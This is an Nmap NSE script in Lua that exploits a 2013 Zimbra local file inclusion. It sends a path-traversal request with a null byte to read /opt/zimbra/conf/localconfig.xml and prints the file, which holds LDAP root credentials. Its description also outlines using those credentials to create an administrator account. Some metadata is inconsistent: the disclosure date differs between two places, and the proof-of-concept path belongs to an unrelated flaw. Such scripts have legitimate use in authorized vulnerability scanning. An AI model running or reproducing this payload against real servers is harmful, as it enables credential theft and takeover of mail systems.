local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

description = [[
A 0 day has been released on the 6th december 2013 by rubina119. 
The vulnerability is a local file inclusion that can retrieve the credentials of the Zimbra installations etc. 
Using this script, we can detect if the file is present. 
If the file is present, we assume that the host might be vulnerable. 

In future version, we'll extract credentials from the file but it's not implemented yet and 
the detection will be accurate. 

TODO: 
Add the possibility to read compressed file (because we're only looking if it exists)
Then, send some payload to create the new mail account
]]

---
-- @usage
-- nmap -sV --script http-vuln-0-day-lfi-zimbra <target>
-- nmap -p80 --script http-vuln-0-day-lfi-zimbra --script-args http-vuln-0-day-lfi-zimbra=/ZimBra <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-0-day-lfi-zimbra: 
-- |   VULNERABLE:
-- |   Zimbra Local File Inclusion and Disclosure of Credentials
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  None, 0-day
-- |     Description:
-- |       A 0 day has been released on the 6th december 2013 by rubina119. 
-- |       The vulnerability is a local file inclusion that can retrieve the credentials of the Zimbra installations etc. 
-- |       Using this script, we can detect if the file is present. 
-- |       If the file is present, we assume that the host might be vulnerable. 
-- |       
-- |       In future version, we'll extract credentials from the file but it's not implemented yet and 
-- |       the detection will be accurate. 
-- |       
-- |       TODO: 
-- |       Add the possibility to read compressed file (because we're only looking if it exists)
-- |       Then, send some payload to create the new mail account
-- |     Disclosure date: 2013-06-12
-- |     Extra information:
-- |       Proof of Concept:/index.php?-s
-- |     References:
-- |_      http://www.exploit-db.com/exploits/30085/
--
-- @args http-vuln-0-day-lfi-zimbra.uri URI. Default: /zimbra
---

author = "Paul AMAR <aos.paul@gmail.com>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

-- function to escape specific characters
local escape = function(str) return string.gsub(str, "%%", "%%%%") end

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/zimbra"

  local vuln = {
       title = 'Zimbra 0-day Local File Inclusion (Gather admin credentials)',
       state = vulns.STATE.NOT_VULN, -- default
       description = [[
This script exploits a Local File Inclusion in
/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
which allows us to see localconfig.xml
that contains LDAP root credentials wich allow us to make requests in
/service/admin/soap API with the stolen LDAP credentials to create user
with administration privlegies
and gain acces to the Administration Console.]],
       references = {
          'http://www.exploit-db.com/exploits/30085/',
       },
       dates = {
           disclosure = {year = '2013', month = '12', day = '6'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local url = "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00"

  stdnse.print_debug(1, "Trying to detect if the server is vulnerable")
  stdnse.print_debug(1, "GET " .. uri .. escape(url)) 

  local detection_session = http.get(host, port, uri..url)

  if detection_session and detection_session.status == 200 then
    if string.match(escape(detection_session.header['content-type']), "application/x-javascript") then
      stdnse.print_debug(1, "The website may be vulnerable to the Zimbra 0-day.")
      vuln.state = vulns.STATE.EXPLOIT
      return vuln_report:make_output(detection_session.body)
    else
      stdnse.print_debug(1, "Bad content-type for the resource : " .. detection_session.header['content-type'])
      return
    end
  else
      stdnse.print_debug(1, "The website seems to be not vulnerable to this attack.")
      return
  end
end
